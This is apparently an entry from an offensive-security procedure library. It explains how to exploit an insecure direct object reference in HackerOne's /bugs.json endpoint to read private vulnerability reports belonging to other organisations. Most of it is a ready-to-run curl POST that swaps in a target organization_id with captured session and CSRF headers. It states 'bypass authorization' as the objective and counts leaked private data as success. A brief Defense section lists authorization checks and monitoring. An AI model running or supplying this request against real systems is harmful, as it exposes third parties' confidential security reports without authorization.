---
id: proc-idor-query-hackerone
tags:
  - idor
  - web
  - discovery
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/hackerone-idor-query-reports]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:48.251Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Query Private Reports via IDOR in /bugs.json

## Summary

This procedure exploits an Insecure Direct Object Reference (IDOR) vulnerability in HackerOne's /bugs.json endpoint by sending a POST request with a manipulated organization_id and a simple text_query, allowing unauthorized retrieval of private vulnerability reports containing the query text from non-owned organizations.

## Description

The /bugs.json endpoint lacks proper authorization checks, permitting authenticated users to query reports from arbitrary organizations using parameters like organization_id and text_query. By setting organization_id to a known value (e.g., 58579) and text_query to '1', the procedure retrieves reports with that digit, exposing sensitive details. This is useful in bug bounty or penetration testing scenarios to demonstrate cross-organizational data leakage. Prerequisites include a valid HackerOne session; outcomes include JSON data with report metadata, enabling further analysis or exfiltration.

## Requirements

1. Authenticated HackerOne account with session cookies and CSRF token.
2. Knowledge of target organization IDs (obtainable from public policy pages).
3. Network access to https://hackerone.com.
4. Tools like curl for HTTP requests.

## Defense

Defensive measures and detection strategies:

- Implement strict authorization checks on organization_id to verify user ownership or permissions.
- Rate-limit and monitor POST requests to /bugs.json for unusual organization_id values or high-volume queries.
- Log and alert on access to reports from organizations not associated with the user's session.

## Objectives

1. Bypass authorization to access private reports in target organizations.
2. Retrieve sensitive report details for analysis.
3. Validate IDOR vulnerability presence.

## Instructions

### Step 1: Prepare Authentication

**Context**: Obtain necessary session details by logging into HackerOne and inspecting network requests (e.g., via browser dev tools) to capture __Host-session cookie and X-Csrf-Token.

No command needed; manually extract values.

### Step 2: Execute IDOR Query

**Context**: Send the POST request to /bugs.json using the prepared authentication to query reports in a non-owned organization, filtering by substates to broaden results.

**Command** ([[commands/hackerone-idor-query-reports]]):

```bash
curl -X POST 'https://hackerone.com/bugs.json' \
  -H 'Cookie: __Host-session=Your-Session-Here' \
  -H 'X-Csrf-Token: Your-Csrf-Here' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  --data-urlencode 'text_query=1' \
  --data-urlencode 'organization_id=58579' \
  --data-urlencode 'persist=true' \
  --data-urlencode 'sort_type=pg_search_rank' \
  --data-urlencode 'view=message' \
  --data-urlencode 'substates[]=new' \
  --data-urlencode 'substates[]=needs-more-info' \
  --data-urlencode 'substates[]=triaged' \
  --data-urlencode 'substates[]=resolved' \
  --data-urlencode 'substates[]=informative' \
  --data-urlencode 'substates[]=not-applicable' \
  --data-urlencode 'substates[]=duplicate' \
  --data-urlencode 'substates[]=retesting' \
  --data-urlencode 'substates[]=pending-program-review' \
  --data-urlencode 'substates[]=spam' \
  --data-urlencode 'duplicates_must_have_no_ref=true'
```

> This command queries reports containing '1' in organization 58579, sorted by search rank. Expected output is a JSON array of report objects; success is indicated by private data from the target org.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/hackerone-idor-query-reports]]

## Tools Used


## Tags

- idor
- web
- discovery
